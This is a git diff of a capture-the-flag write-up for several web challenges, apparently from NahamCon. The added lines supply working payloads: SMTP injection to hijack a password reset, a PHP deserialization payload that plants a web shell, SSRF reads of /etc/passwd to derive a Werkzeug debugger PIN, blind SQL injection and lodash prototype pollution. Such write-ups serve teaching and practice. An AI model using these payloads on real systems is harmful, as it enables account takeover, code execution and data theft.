@@ -113,9 +113,7 @@ The web application have a register,login,secret(create,delete,view),forgot pass
 we can construct this url to generate admin otp
 `otpauth://totp/2Password:admin?secret=MFSG22LOGEZDGNBVGY3TQOI%3D&issuer=2Password`
 
-The function of forgot pass is vulnerable to SMTP Injection, so we can add our email before the victim email and we both the forgot password email.
-
-after reset the admin password and the otp, just login and fetch the flag like a boss 😎😎
+The function of forgot pass is vulnerable to SMTP Injection, so we can add our email before the victim email and we both the forgot password email, the payload used is `{"username":"admin","email":"hacker@gmail.com\nadmin@gmail.com"}`, after reset the admin password and the otp, just login and fetch the flag like a boss 😎😎
 
 ---
 # [Medium] Cereal and Milk - 491 points (74 Solves)
@@ -131,7 +129,67 @@ Sometimes, it tastes a bit odd though.
 
 ### Solve
 
-This challenge is straigth forward, our input is unserialized by the application, and we just control the log filename we want and the content by using this serialize payload
+This challenge is straigth forward we're given the source code of the apps.
+
+- index.php
+```
+<?php
+
+include 'log.php';
+
+class CerealAndMilk
+{
+    public $logs = "request-logs.txt";
+    public $request = '';
+    public $cereal = 'Captain Crunch';
+    public $milk = '';
+    
+
+    public function processed_data($output)
+    {
+        echo "Deserilized data:<br> Coming soon.";
+       # echo print_r($output);
+        
+    }
+
+    public function cereal_and_milk()
+    {
+     echo $this->cereal . " is the best cereal btw.";   
+    }
+
+}
+
+$input = $_POST['serdata'];
+$output = unserialize($input);
+
+$app = new CerealAndMilk;
+$app -> cereal_and_milk($output);
+
+
+
+?>
+```
+
+- log.php
+
+```
+<?php
+
+class log
+{
+    public function __destruct()
+        {
+            $request_log = fopen($this->logs , "a");
+            fwrite($request_log, $this->request);
+            fwrite($request_log, "\r\n");
+            fclose($request_log);
+        }
+}
+
+?>
+```
+
+by reading the code we understand that our input is unserialized by the application, and we just control the log filename`($logs)` we want and the content`($request)` by using this serialize payload below:
 
 ```
 O:3:"log":4:{s:4:"logs";s:16:"yerabajigur5.php";s:7:"request";s:28:"<?php $_GET[1]($_GET[2]); ?>";s:6:"cereal";s:5:"XXXXX";s:4:"milk";s:2:"AA"}
@@ -228,7 +286,7 @@ blind("group_concat(password)","FROM user where username='admin'")
 
 ```
 
-Found the password of admin account and login to get the flag.
+This script help me to perform the SQL Injection with boolean check every time the injection fired, and using binary search algorith to make the search efficient, at the end of the day Found the password of admin account and just login to get the flag.
 
 ---
 # [Medium] Asserted - 301 points (283 Solves)
@@ -294,7 +352,7 @@ The application is expecting an https website but was using broken regex check, 
 
 `file:///etc/passwd#https://`
 
-Since the werkezeug debugger is enabled, we can generate the PIN based on gathering all the information from the system.
+Since the werkezeug debugger is enabled, we can generate the PIN(used by werkzeug) based on gathering all the information from the system.
 
 ```
 Mac-Addr => http://challenge.nahamcon.com:31919/?destination=file:///sys/class/net/eth0/address%23https://xx
@@ -374,7 +432,7 @@ print(rv)
 
 ```
 
-And surfing inside the console to get flag :))
+And surfing inside the werkezeug console to get flag :))
 
 
 ---
@@ -484,12 +542,15 @@ Orion found this new online sharing service... do you have an opinion? Yeah, eve
 
 The website is like a simple version of a twitter, we all got stuck no where until the problem setter update the challenges and add package.json in the website.
 
-Trying to exploit the prototype pollution after looking the vulnerable version of lodash used.
+Instantly trying to exploit the prototype pollution after looking the vulnerable version of lodash used from `package.json` file.
 
-Thinking about RCE with the pug but got us nowhere, 
-by the power of `hacker sense`, we just need to pollute the `isAdmin` variable that validate if the user is admin or not, the `isAdmin` is known  at the JWT .
+Thinking about Remote Code Execution(RCE) by abusing the `prototype pollution` and the `pug` but got us nowhere, 
+by the power of `hacker sense`,we just need to pollute the `isAdmin` variable that validate if the user is admin or not, the `isAdmin` is known  at the JsonWebToken(JWT) session.
 
 ```
+POST /tweet HTTP/1.1
+..snip..
+
 {"abcdefghijklmn":{"__proto__":{"isAdmin":1}}}
 ```
 
